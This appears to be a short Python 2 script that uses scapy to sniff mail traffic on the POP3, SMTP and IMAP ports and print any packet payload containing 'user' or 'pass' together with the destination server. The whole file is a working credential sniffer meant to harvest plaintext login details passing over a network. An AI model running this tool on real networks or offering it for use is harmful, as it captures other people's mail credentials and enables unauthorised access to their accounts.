import threading
from scapy.all import *


# packet callback
def packet_callback(packet):
    # print packet.show()

    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload


# start up our sniffer - store =0 prevents scapy from storing packets in mem.
# Useful for long term sniffing.
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)